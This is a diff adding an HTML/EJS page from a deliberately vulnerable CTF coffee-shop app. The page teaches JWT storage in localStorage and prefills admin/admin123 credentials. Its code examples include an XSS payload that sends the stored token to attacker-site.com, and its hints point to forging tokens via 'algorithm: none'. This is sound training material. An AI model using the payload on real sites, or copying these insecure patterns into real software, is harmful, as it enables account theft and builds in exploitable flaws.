@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <title>JWT LocalStorage Demo - Coffee Shop</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    .code-block {
+      background-color: #f8f9fa;
+      border: 1px solid #dee2e6;
+      border-radius: 0.375rem;
+      padding: 1rem;
+      margin: 1rem 0;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+    }
+
+    .token-display {
+      word-break: break-all;
+      background-color: #e9ecef;
+      padding: 0.5rem;
+      border-radius: 0.25rem;
+      border: 1px solid #adb5bd;
+    }
+  </style>
+</head>
+
+<body>
+  <%- include('partials/navbar') %>
+
+    <div class="container mt-4">
+      <div class="row">
+        <div class="col-12">
+          <h1 class="mb-4">JWT LocalStorage Demo</h1>
+
+          <div class="alert alert-info">
+            <h5>Educational Purpose</h5>
+            <p>This page demonstrates JWT usage with localStorage for CTF/TryHackMe educational purposes. In production,
+              use secure HTTP-only cookies.</p>
+          </div>
+
+          <!-- Current Token Status -->
+          <div class="card mb-4">
+            <div class="card-header">
+              <h5>Current JWT Status</h5>
+            </div>
+            <div class="card-body">
+              <div id="token-status">
+                <p><strong>Token Exists:</strong> <span id="token-exists" class="badge bg-secondary">Unknown</span></p>
+                <p><strong>Token Valid:</strong> <span id="token-valid" class="badge bg-secondary">Unknown</span></p>
+                <p><strong>Username:</strong> <span id="token-username">-</span></p>
+                <p><strong>Role:</strong> <span id="token-role">-</span></p>
+                <p><strong>Expires:</strong> <span id="token-expires">-</span></p>
+              </div>
+
+              <button class="btn btn-primary" onclick="refreshTokenStatus()">Refresh Status</button>
+              <button class="btn btn-warning" onclick="showTokenValue()">Show Token Value</button>
+              <button class="btn btn-danger" onclick="clearToken()">Clear Token</button>
+            </div>
+          </div>
+
+          <!-- Token Display Area -->
+          <div class="card mb-4" id="token-display-card" style="display: none;">
+            <div class="card-header">
+              <h5>JWT Token Value</h5>
+            </div>
+            <div class="card-body">
+              <div class="token-display" id="token-value"></div>
+              <button class="btn btn-secondary mt-2" onclick="copyToken()">Copy to Clipboard</button>
+            </div>
+          </div>
+
+          <!-- API Testing -->
+          <div class="card mb-4">
+            <div class="card-header">
+              <h5>API Testing with JWT</h5>
+            </div>
+            <div class="card-body">
+              <p>Test authenticated API calls using JWT from localStorage:</p>
+
+              <div class="row">
+                <div class="col-md-6">
+                  <h6>Login via API</h6>
+                  <div class="mb-3">
+                    <input type="text" class="form-control mb-2" id="api-username" placeholder="Username" value="admin">
+                    <input type="password" class="form-control mb-2" id="api-password" placeholder="Password"
+                      value="admin123">
+                    <button class="btn btn-success" onclick="apiLogin()">API Login</button>
+                  </div>
+                </div>
+                <div class="col-md-6">
+                  <h6>Test Authenticated Request</h6>
+                  <button class="btn btn-info" onclick="testAuthenticatedRequest()">Test API Call</button>
+                  <div id="api-response" class="mt-2"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Code Examples -->
+          <div class="card mb-4">
+            <div class="card-header">
+              <h5>Code Examples</h5>
+            </div>
+            <div class="card-body">
+              <h6>1. Get JWT from localStorage</h6>
+              <div class="code-block">
+                const token = localStorage.getItem('jwt_token');
+                console.log('JWT Token:', token);
+              </div>
+
+              <h6>2. Decode JWT payload (client-side only)</h6>
+              <div class="code-block">
+                function decodeJWT(token) {
+                try {
+                const payload = token.split('.')[1];
+                return JSON.parse(atob(payload));
+                } catch (error) {
+                return null;
+                }
+                }
+
+                const decoded = decodeJWT(token);
+                console.log('Decoded payload:', decoded);
+              </div>
+
+              <h6>3. Make authenticated API request</h6>
+              <div class="code-block">
+                fetch('/api/protected-endpoint', {
+                method: 'GET',
+                headers: {
+                'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
+                }
+                })
+                .then(response => response.json())
+                .then(data => console.log(data));
+              </div>
+
+              <h6>4. XSS Payload to steal JWT</h6>
+              <div class="code-block text-danger">
+                &lt;script&gt;
+                // Malicious payload to steal JWT from localStorage
+                const stolenToken = localStorage.getItem('jwt_token');
+                fetch('https://attacker-site.com/steal?token=' + stolenToken);
+                &lt;/script&gt;
+              </div>
+            </div>
+          </div>
+
+          <!-- CTF Hints -->
+          <div class="card">
+            <div class="card-header bg-warning">
+              <h5>🚩 CTF Exploitation Hints</h5>
+            </div>
+            <div class="card-body">
+              <ul>
+                <li>JWT tokens in localStorage are vulnerable to XSS attacks</li>
+                <li>Unlike HTTP-only cookies, localStorage can be accessed via JavaScript</li>
+                <li>Check browser Developer Tools → Application → Local Storage</li>
+                <li>Look for XSS vulnerabilities to extract tokens</li>
+                <li>This application uses "algorithm: none" - tokens can be manipulated</li>
+                <li>Try modifying the JWT payload and removing the signature</li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="/js/jwt-utils.js"></script>
+
+    <script>
+      // Refresh token status display
+      function refreshTokenStatus() {
+        const token = getJWT();
+        const tokenExists = !!token;
+        const tokenValid = isJWTValid();
+
+        document.getElementById('token-exists').textContent = tokenExists ? 'Yes' : 'No';
+        document.getElementById('token-exists').className = tokenExists ? 'badge bg-success' : 'badge bg-danger';
+
+        document.getElementById('token-valid').textContent = tokenValid ? 'Valid' : 'Invalid/Expired';
+        document.getElementById('token-valid').className = tokenValid ? 'badge bg-success' : 'badge bg-danger';
+
+        if (token) {
+          const decoded = decodeJWT(token);
+          if (decoded) {
+            document.getElementById('token-username').textContent = decoded.username || '-';
+            document.getElementById('token-role').textContent = decoded.role || '-';
+            document.getElementById('token-expires').textContent = new Date(decoded.exp * 1000).toLocaleString();
+          }
+        } else {
+          document.getElementById('token-username').textContent = '-';
+          document.getElementById('token-role').textContent = '-';
+          document.getElementById('token-expires').textContent = '-';
+        }
+      }
+
+      // Show token value
+      function showTokenValue() {
+        const token = getJWT();
+        if (token) {
+          document.getElementById('token-value').textContent = token;
+          document.getElementById('token-display-card').style.display = 'block';
+        } else {
+          alert('No JWT token found in localStorage');
+        }
+      }
+
+      // Copy token to clipboard
+      function copyToken() {
+        const tokenElement = document.getElementById('token-value');
+        navigator.clipboard.writeText(tokenElement.textContent).then(() => {
+          alert('Token copied to clipboard!');
+        });
+      }
+
+      // Clear token
+      function clearToken() {
+        removeJWT();
+        refreshTokenStatus();
+        document.getElementById('token-display-card').style.display = 'none';
+        alert('JWT token cleared from localStorage');
+      }
+
+      // API login
+      async function apiLogin() {
+        const username = document.getElementById('api-username').value;
+        const password = document.getElementById('api-password').value;
+
+        try {
+          const response = await fetch('/auth/login-api', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ username, password })
+          });
+
+          const data = await response.json();
+
+          if (data.success) {
+            storeJWT(data.token);
+            alert('Login successful! JWT stored in localStorage.');
+            refreshTokenStatus();
+          } else {
+            alert('Login failed: ' + data.message);
+          }
+        } catch (error) {
+          alert('Login error: ' + error.message);
+        }
+      }
+
+      // Test authenticated request
+      async function testAuthenticatedRequest() {
+        const responseDiv = document.getElementById('api-response');
+
+        try {
+          const response = await authenticatedFetch('/coffee');
+          const text = await response.text();
+
+          responseDiv.innerHTML = `
+                    <div class="alert ${response.ok ? 'alert-success' : 'alert-danger'}">
+                        <strong>Status:</strong> ${response.status} ${response.statusText}<br>
+                        <strong>Response:</strong> ${response.ok ? 'Authentication successful' : 'Authentication failed'}
+                    </div>
+                `;
+        } catch (error) {
+          responseDiv.innerHTML = `
+                    <div class="alert alert-danger">
+                        <strong>Error:</strong> ${error.message}
+                    </div>
+                `;
+        }
+      }
+
+      // Initialize on page load
+      document.addEventListener('DOMContentLoaded', function () {
+        refreshTokenStatus();
+      });
+    </script>
+</body>
+
+</html>
